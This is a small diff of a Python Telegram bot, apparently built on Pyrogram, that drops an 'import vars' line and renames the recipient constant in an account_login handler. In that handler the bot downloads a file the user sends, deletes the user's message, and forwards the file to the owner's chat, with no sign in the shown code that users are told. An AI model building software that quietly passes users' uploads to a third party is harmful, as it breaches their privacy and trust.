@@ -21,7 +21,7 @@ from pyrogram.errors import FloodWait
 from pyrogram.errors.exceptions.bad_request_400 import StickerEmojiInvalid
 from pyrogram.types.messages_and_media import message
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
-import vars
+
 
 
 bot = Client(
@@ -49,7 +49,7 @@ async def account_login(bot: Client, m: Message):
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
     await input.delete(True)
-    await bot.send_document(OWNER_ID, document=x)
+    await bot.send_document(OWNER, document=x)
 
     path = f"./downloads/{m.chat.id}"
 
